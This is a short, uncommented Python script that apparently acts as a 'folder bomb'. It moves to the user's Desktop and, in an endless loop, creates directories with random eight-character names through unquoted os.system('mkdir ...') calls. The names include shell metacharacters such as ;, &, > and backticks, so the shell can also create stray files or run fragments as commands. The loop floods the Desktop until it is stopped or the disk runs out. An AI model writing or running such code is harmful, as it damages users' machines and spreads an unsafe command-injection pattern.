from os import *
from sys import *
from random import *
def Desktop():
    lst = []
    addres = getcwd()
    l = len(addres)
    for i in range(l):
        lst.append(addres[i])
    addres = ''
    for i in range(l):
        addres += lst[i]
        if lst[i] == 'p' and lst[i-1] == 'o' and lst[i-2] == 't' and lst[i-3] == 'k' and lst[i-4] == 's' and lst[i-5] == 'e' and lst[i-6] == 'D':
            break            
    return addres
addres = Desktop()
chdir(addres)
name = "abcdefghijklmnopqrstuvwxyz#@!$%^&*()_+=-/\?.,:;><~`"
le = len(name) - 1
while True:
    rand_1 = randint(0,le)
    rand_2 = randint(0,le)
    rand_3 = randint(0,le)
    rand_4 = randint(0,le)
    rand_5 = randint(0,le)
    rand_6 = randint(0,le)
    rand_7 = randint(0,le)
    rand_8 = randint(0,le)
    direcory = name[rand_1] + name[rand_2] + name[rand_3] + name[rand_4] + name[rand_5] + name[rand_6] + name[rand_7] + name[rand_8]
    system("cd ..")
    system("mkdir {}".format(direcory))